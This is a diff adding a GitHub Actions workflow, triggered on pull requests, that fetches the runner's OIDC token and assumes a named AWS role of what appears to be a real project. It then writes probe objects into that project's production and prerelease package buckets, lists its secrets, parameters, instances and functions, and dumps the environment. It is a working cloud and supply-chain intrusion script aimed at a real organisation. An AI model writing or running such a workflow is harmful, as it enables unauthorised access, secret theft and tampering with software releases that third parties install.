@@ -1,0 +1,40 @@
+name: w5 oidc probe
+on:
+  pull_request:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: claims
+        run: |
+          echo "repo=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME ref=$GITHUB_REF"
+          TOK=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
+          echo "$TOK" | cut -d. -f2 | base64 -d 2>/dev/null || true
+          echo
+      - name: seat
+        run: id; hostname; cat /etc/hostname; uname -a; curl -s -m 5 http://169.254.169.254/latest/meta-data/instance-id || true
+      - name: assume A
+        continue-on-error: true
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::962042992619:role/chainflip-github-bot
+          aws-region: eu-central-1
+      - name: aws A
+        continue-on-error: true
+        run: |
+          aws sts get-caller-identity
+          aws iam list-attached-role-policies --role-name chainflip-github-bot 2>&1 | head -30
+          aws s3api put-object --bucket apt.aws.chainflip.xyz --key w5probe/oidc.txt --body /etc/hostname && echo PUT_DEV_OK
+          aws s3api put-object --bucket chainflip-mainnet-prerelease --key w5probe/oidc.txt --body /etc/hostname && echo PUT_PRE_OK
+          aws s3api put-object --bucket repo.chainflip.io --key w5probe/oidc.txt --body /etc/hostname && echo PUT_PROD_OK
+          aws s3 ls
+          aws secretsmanager list-secrets 2>&1 | head -40
+          aws ssm describe-parameters --max-items 20 2>&1 | head -30
+          aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,PrivateIpAddress,PublicIpAddress,Tags[?Key==`Name`].Value|[0]]' --output text 2>&1 | head -40
+          aws lambda list-functions --query 'Functions[].[FunctionName,Runtime]' --output text 2>&1 | head -20
+      - name: env
+        run: env | sort
